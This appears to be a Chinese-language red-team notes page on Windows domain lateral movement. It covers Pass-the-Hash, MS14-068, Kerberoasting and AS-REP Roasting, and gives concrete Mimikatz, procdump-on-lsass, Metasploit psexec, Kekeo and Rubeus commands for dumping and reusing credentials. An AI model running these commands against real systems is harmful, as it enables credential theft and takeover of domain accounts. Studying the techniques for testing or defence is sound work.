# 横向移动
## PTH (Pass the Hash)
当获取到某个用户的NTLM哈希后，可以利用该哈希作为凭证进行远程登录。根据哈希的加密方式不同，攻击方法也有所区别：
- 若哈希采用RC4加密，则执行的是经典的Pass the Hash (PTH)。
- 若哈希基于AES密钥，则称为Pass the Key。

需要注意的是，NTLM和Kerberos认证协议都存在PTH漏洞：
- NTLM协议直接依赖于客户端提供的哈希值进行身份验证。
- Kerberos协议虽然复杂一些，但其认证过程也是从客户端的哈希开始的，因此同样容易受到PTH的影响。

### 哈希获取方法
1. **使用Meterpreter中的Mimikatz模块**:
   - 加载Mimikatz插件: `meterpreter > load mimikatz`
   - 执行相关命令以提取哈希: `mimikatz_command -f "privilege::debug samdump::hashes"`
   或者尝试其他子命令如`msv/kerberos/wdigest`

2. **利用Meterpreter内置的哈希导出功能**:
   - 直接运行`hashdump`或推荐使用的`run windows/gather/smart_hashdump`

3. **上传Mimikatz至目标机器并远程调用**:
   - 在获得shell权限后，上传经过免杀处理的Mimikatz.exe文件，并通过命令行界面执行相应操作。

4. **使用Procdump与Mimikatz组合技术**:
   - 上传Procdump工具至目标主机并生成lsass.dmp文件: `procdump64.exe -accepteula -ma lsass.exe lsass.dmp`
   - 将lsass.dmp传输回本地，再由Mimikatz解析出其中包含的密码哈希。

5. **Cobalt Strike框架下的哈希抓取**:
   - 通过Beacon会话执行`hashdump`或`mimikatz`指令来获取所需信息。

6. **读取SAM数据库中的哈希**:
   - 利用Mimikatz在线读取SAM表项：`privilege::debug token::elevate lsadump::sam`
   - 或者将整个SAM注册表键值导出到本地，之后再利用Mimikatz分析。

### Pass the Hash 攻击
一旦成功获取了目标系统的哈希值，即可实施以下几种横向移动策略：

1. **Metasploit Framework内的psexec模块**:
   - 配置好各项参数后启动exploit: `use exploit/windows/smb/psexec; set SMBUser/Administrator; set SMBPass/<ntlm-hash>; run`

2. **Mimikatz进行PTH攻击**:
   - 在目标系统上部署Mimikatz，并输入类似`sekurlsa::pth /user:admin /domain:<domain> /ntlm:<ntlm-hash>`这样的命令

3. **借助Cobalt Strike平台完成PTH**:
   - 选择合适的本地哈希并通过PSEXEC模块实现对域内其他计算机的控制。

## MS14-068漏洞利用
此安全漏洞允许任何域用户提升权限至域管理员级别。受影响的操作系统版本包括Windows Server 2000及以上版本；修复补丁为KB3011780。

### MS14-068漏洞利用示例
1. **Kekeo工具**:
   - 清除现有票据缓存(`kerberos::purge`)后再尝试利用该漏洞(`exploit::ms14068 /user:... /password:... /domain:... /ptt`)

2. **Golden Ticket攻击**:
   - 使用特定脚本创建一个具有高权限的服务票证，从而绕过常规的身份验证机制。

## Kerberoasting攻击
Kerberoasting是一种针对Kerberos服务主体名称（SPN）的安全威胁模型。攻击者可以从TGS-REP响应中提取出被请求服务账户所保护的服务票证，进而离线破解这些票证以恢复原始密码。

### 获取SPN列表的方法
- **SetSPN工具**: 运行`setspn -q */*`命令列出所有已注册的SPN
- **PowerShell脚本**: 利用GetUserSpns等脚本来发现潜在的目标

### 提取服务票证的技术手段
- **Rubeus.exe**: 自编译后通过`Rubeus.exe kerberoast`命令获取票证
- **Mimikatz**: 发起Kerberos ASK请求(`kerberos::ask /target:<spn>`)并查看结果(`kerberos::list`)
- **PowerShell脚本**: 结合System.IdentityModel库创建新的KerberosRequestorSecurityToken对象

### 导出及破解哈希
- **Mimikatz**: 可以批量导出所有收集到的服务票证
- **Empire PowerShell框架**: 转换为Hashcat支持格式后便于后续暴力破解
- **Hashcat**: 对符合特定模式的输入数据执行快速字典攻击
- **tgsrepcrack.py脚本**: 特别适用于处理.kirbi扩展名的文件类型

### 修改及注入伪造的服务票证
- **Kerberoast工具集**: 包含用于修改、保存以及重新注入修改后的服务票证的Python脚本

## AS-REP Roasting
相比Kerberoasting而言，AS-REP Roasting可能显得稍显逊色。它主要依靠禁用Kerberos预身份验证功能来捕捉用户的AS-REP消息，并从中提取可用于破解的客户端哈希值。

### 实施AS-REP Roasting
- **Rubeus.exe**: 通过`asreproast`选项自动查找并下载未启用预身份验证的账户的AS-REP响应
- **Empire框架配合ASREPRoast.ps1脚本**: 用于枚举那些设置了“无需Kerberos预身份验证”的用户账号